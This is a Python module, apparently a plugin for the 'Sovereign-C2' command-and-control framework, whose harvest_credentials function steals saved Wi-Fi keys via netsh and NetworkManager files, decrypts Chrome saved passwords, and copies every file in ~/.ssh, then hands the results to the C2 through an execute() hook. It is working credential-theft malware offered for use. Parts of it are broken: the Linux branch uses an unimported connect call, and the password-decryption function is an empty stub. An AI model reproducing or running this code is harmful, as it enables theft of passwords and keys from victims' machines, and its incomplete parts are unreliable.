######################################################################################################################################################################## 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”).
# Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
# and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A  
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################

import os
import subprocess

# Banner
def print_banner():
    banner = r"""
  _________                                   .__                         _________  ________             ___________                                                  __    
 /   _____/ _______  __  ____ _______   ____  |__| ____    ____           \_   ___ \ \_____  \            \_   _____/____________     _____   ______  _  _____________|  | __
 \_____  \ /  _ \  \/ /_/ __ \\_  __ \_/ __ \ |  |/ ___\  /    \   ______ /    \  \/  /  ____/    ______   |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 /        (  <_> )   / \  ___/ |  | \/\  ___/ |  / /_/  >|   |  \ /_____/ \     \____/       \   /_____/   |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
/_______  /\____/ \_/   \___  >|__|    \___  >|__\___  / |___|  /          \______  /\_______ \            \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                  \/             \/   /_____/       \/                  \/         \/                \/                \/       \/     \/                        \/

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

           Sovereign-C2 Framework
    """
    print(banner)
    print("Sovereign-c2 - 41PH4-01 & Our Community\n")

def harvest_credentials():
    credentials = []

    if os.name == 'nt':
        # Windows Wi-Fi password harvesting
        command = "netsh wlan show profiles"
        profiles = os.popen(command).read()
        for profile in profiles.split('\n'):
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1].strip()
                command = f"netsh wlan show profile name=\"{profile_name}\" key=clear"
                result = os.popen(command).read()
                credentials.append(result)
        
        # Windows browser password harvesting (example for Chrome)
        try:
            import win32crypt
            from sqlite3 import connect

            # Path to Chrome's login data
            login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
            conn = connect(login_data_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
        except Exception as e:
            credentials.append(f"Failed to extract browser passwords: {e}")

    elif os.name == 'posix':
        # Linux/MacOS Wi-Fi password harvesting
        command = "sudo cat /etc/NetworkManager/system-connections/*"
        try:
            result = subprocess.check_output(command, shell=True).decode()
            credentials.append(result)
        except subprocess.CalledProcessError as e:
            credentials.append(f"Failed to extract Wi-Fi passwords: {e}")

        # Extract SSH keys
        ssh_keys_path = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_keys_path):
            for file in os.listdir(ssh_keys_path):
                with open(os.path.join(ssh_keys_path, file), 'r') as f:
                    credentials.append(f.read())
    
        # Linux/MacOS browser password harvesting (example for Chrome)
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            import json

            # Path to Chrome's login data
            login_data_path = os.path.join(os.path.expanduser("~"), ".config", "google-chrome", "Default", "Login Data")
            conn = connect(login_data_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                # Decryption logic for Linux/MacOS
                password = decrypt_linux_password(encrypted_password)
                credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
        except Exception as e:
            credentials.append(f"Failed to extract browser passwords: {e}")

    return credentials

def decrypt_linux_password(encrypted_password):
    # Implementation of decryption logic for Linux/MacOS Chrome passwords
    pass  # Add the decryption logic here

def execute(*args):
    return "\n".join(harvest_credentials())

if __name__ == "__main__":
    creds = harvest_credentials()
    for cred in creds:
        print(cred)

